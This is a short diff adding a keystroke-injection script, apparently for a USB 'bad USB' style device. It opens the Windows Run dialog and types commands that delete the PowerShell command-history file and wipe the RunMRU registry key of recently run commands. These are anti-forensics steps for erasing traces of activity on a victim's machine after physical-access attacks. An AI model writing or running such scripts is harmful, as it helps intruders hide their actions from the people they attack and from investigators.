@@ -1,0 +1,6 @@
+Press: 131 + 114
+CustomDelay: 500
+PrintLine: powershell "Remove-Item (Get-PSReadlineOption).HistorySavePath"
+Press: 131 + 114
+CustomDelay: 500
+PrintLine: reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
